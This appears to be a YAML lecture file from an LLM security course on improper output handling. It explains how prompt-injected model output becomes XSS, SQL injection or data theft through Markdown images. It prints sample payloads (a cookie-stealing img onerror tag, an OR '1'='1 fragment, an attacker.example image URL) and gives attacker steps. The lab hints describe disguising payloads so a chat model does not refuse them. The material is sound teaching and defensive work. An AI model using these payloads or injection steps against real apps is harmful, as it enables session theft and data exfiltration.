@@ -1,0 +1,146 @@
+slug: l08
+num: "08"
+lecture: 8
+week: 8
+short: Improper output handling
+title: Improper output handling
+time: about 3.5 hours
+lede: When an app trusts what the model writes, old web bugs come back. XSS, SQL injection and command injection, delivered by an LLM.
+owasp: [LLM05]
+agentic: [ASI05]
+atlas: [AML.T0136, AML.T0102, AML.T0051.001]
+other_fw:
+  - [OWASP Top 10 web, "The same bug classes as A03 Injection in the web Top 10. Only the source of the text is new."]
+  - [CWE, "CWE-79 cross-site scripting, CWE-89 SQL injection, CWE-78 OS command injection."]
+
+idea: |
+  Developers learned long ago never to trust user input. Many still trust model output. But model output is shaped by user input, and by any document the model read. So model output is **user input with one more step**.
+
+  If the app puts model output into a web page, a SQL query, a shell command or a URL without checks, an attacker who steers the model can run code in those places.
+
+  !eli5 You would not let a stranger write directly on your shop's price board. If you let a parrot write on it, and the stranger can teach the parrot words, the stranger is still writing on your board.
+
+terms:
+  - [XSS, "Cross-site scripting. The attacker's script runs in another user's browser."]
+  - [SQL injection, "Text that changes the meaning of a database query."]
+  - [Output encoding, "Turning special characters into safe forms for the place they go, such as < becoming &lt; in HTML."]
+  - [Sanitizing, "Removing dangerous parts of HTML while keeping safe formatting. DOMPurify is a common library for this."]
+  - [CSP, "Content Security Policy. A browser rule that limits which scripts, images and links a page may load."]
+  - [Markdown image exfiltration, "The model writes an image link with private data in the URL. The browser loads it and sends the data to the attacker's server."]
+
+how: |
+  ### One payload, three destinations
+
+  Module 11 shows a work-order system. One injected request makes the model write a summary with `<img src=x onerror="send(document.cookie)">` and a district value of `North 3' OR '1'='1`.
+
+  1. **On the requester's own page**, the script runs in the attacker's own browser. Little harm.
+  2. **On the dispatcher's console**, the script runs later in a staff browser and steals that session. High harm. This is stored XSS.
+  3. **In the district lookup**, the text joins a SQL query and matches every row. SQL injection.
+
+  The danger depends on **where the output lands and who sees it there**. The fixes are old web defenses, applied to a new source of text.
+
+  ### Data theft through links and images
+
+  Chat apps render Markdown. An injected instruction makes the model write `![chart](https://attacker.example/?d=SECRET)`. The browser loads the image and sends the secret. The user clicks nothing. EchoLeak used this pattern.
+
+diagrams:
+  - type: split
+    title: Where model output goes, and what can go wrong there
+    source: ["Model output shaped by an attacker", "atk"]
+    targets:
+      - ["Web page", "box", "script runs. XSS"]
+      - ["SQL query", "box", "query changes. SQL injection"]
+      - ["Shell or eval", "box", "command runs. RCE"]
+      - ["Image or link URL", "box", "data leaves. Exfiltration"]
+    color: atk
+    caption: Each destination needs its own control. Encoding for HTML, parameters for SQL, no shell at all for commands, an allow list for URLs.
+
+attack_steps:
+  - Find where the model's output is shown or used. Look at web pages, admin consoles, logs, databases and tool calls.
+  - Get your text into the model's input, directly or through content it reads.
+  - Make the model repeat a payload made for that destination, such as an HTML tag, a SQL fragment or a Markdown image.
+  - Wait for the output to land where it runs, often in another user's session.
+
+cases:
+  - [EchoLeak, 2025, "Copilot wrote private data into a link that loaded on its own. The data left through the output channel, not through a tool."]
+  - [PortSwigger lab, "A product review hides an HTML payload. When the LLM chat repeats the review to another user, the payload runs in that user's browser."]
+
+defense: |
+  - Treat the model as an untrusted user. Apply zero trust to everything it writes.
+  - **Encode for the destination.** HTML encode text that goes into a page. Use parameterized queries for SQL. Never pass model output to eval, exec or a shell.
+  - **Sanitize rich output.** If you render Markdown or HTML, run it through a sanitizer such as DOMPurify with a strict allow list of tags.
+  - **Block outside resources.** Do not auto-load images or links from domains you do not trust. Set a strict CSP.
+  - **Validate structure.** If you expect one of 12 district names, accept only those 12.
+  - Log outputs, so you can find what an attack touched.
+
+defense_steps:
+  - Draw every place model output goes.
+  - Name the right control for each place, using the list above.
+  - Put the control in code after the model, not in the prompt.
+  - Test each place with a known payload, such as a harmless alert script.
+
+lab:
+  intro: |
+    Solve LLMGoat A05, then the PortSwigger lab on insecure output handling. The PortSwigger lab needs a free account. It runs on PortSwigger's servers, so you attack only their lab.
+  steps:
+    - Solve LLMGoat A05 and save the prompt.
+    - Open the PortSwigger lab. Read the goal. You must make another user's browser run your code.
+    - Ask the live chat about products. See which product text it repeats.
+    - Test whether the chat output is HTML encoded. Try a harmless tag in a message to the chat.
+    - Find a place where text that another user will see reaches the chat, such as a product review.
+    - Plant a payload there that does the lab's goal when the chat repeats it to the other user.
+    - "Extend task. Solve one more PortSwigger Web LLM lab of your choice."
+  hints:
+    - The model may refuse to repeat obvious script tags. Make the payload look like part of a normal review.
+    - Check which element the lab wants you to act on, such as a form in the account page.
+  links: [llmgoat, pslab, psweb]
+
+readings:
+  - [owasp05, "The official entry. Lists examples such as XSS, SQL injection and RCE, and mitigations such as zero trust on output, encoding and parameterized queries."]
+  - [auth0, "Explains why LLM output handling is the new XSS, with clear examples."]
+  - [shielda, "Looks at errors and exceptions in agent workflows and gives structured ways to handle them, such as retry, roll back and send to a person."]
+star: [owasp05]
+
+questions:
+  - - Why do developers who would never trust user input blindly trust LLM output?
+    - |
+      - The model feels like part of the system, not like a user. It runs on the company's account and speaks well.
+      - The developer wrote the prompt, so they feel they control the output. A prompt is a request, not a rule.
+      - The habit is new. Years of training taught "validate input". The rule "validate model output" is not yet second nature.
+      - Output that looks normal hides the attack. A review summary with one HTML tag does not look like an attack.
+
+      But anyone who can shape the model's input can shape its output. So model output deserves the same distrust as user input.
+  - - LLMs write Markdown. If we HTML encode everything, we break formatting. How do we tell safe formatting such as <b> from a script? DOMPurify or output encoding?
+    - |
+      Use both, each where it fits.
+
+      - **Output encoding** is the safe default for plain text in a page. It shows `<` as a character, so nothing runs. It breaks formatting.
+      - For rich output, convert Markdown to HTML with a renderer that does not allow raw HTML, then run the result through a **sanitizer** such as DOMPurify with a strict allow list (bold, lists, code, links). It removes scripts, event handlers and unknown tags.
+      - Add controls for links and images. Allow only trusted domains, or show links without auto-loading images. This stops Markdown exfiltration, which uses allowed tags.
+      - Add a strict CSP as a last layer.
+
+quiz:
+  - q: The same injected script lands in two places. Where is it most dangerous?
+    opts: ["In the attacker's own chat window", "In a staff console that other people open later", "In a log file nobody reads"]
+    a: 1
+    why: Stored XSS in a staff console runs with that staff member's session and power.
+  - q: The model's output fills a SQL WHERE clause. What is the right control?
+    opts: ["Ask the model to write safe SQL", "Use a parameterized query and validate the value against an allow list", "HTML encode the value"]
+    a: 1
+    why: Parameters keep data from changing the query. HTML encoding is for web pages, not SQL.
+  - q: A chat app renders Markdown images from any domain. What is the risk?
+    opts: ["Slow pages", "An injected image link can send private data to the attacker's server", "None"]
+    a: 1
+    why: Loading the image sends the URL, including any data in it, to the attacker.
+
+deliverables:
+  - Your answers to both discussion questions.
+  - The prompt that solved LLMGoat A05.
+  - Screenshots that show the PortSwigger lab solved.
+
+refs:
+  - "OWASP. [LLM05 2025 Improper output handling](@owasp05)."
+  - "Auth0. [OWASP LLM05 improper output handling](@auth0)."
+  - "[SHIELDA, structured handling of exceptions in LLM-driven agentic workflows](@shielda), 2025."
+  - "PortSwigger. [Exploiting insecure output handling in LLMs](@pslab)."
+  - "Cure53. [DOMPurify](https://github.com/cure53/DOMPurify)."
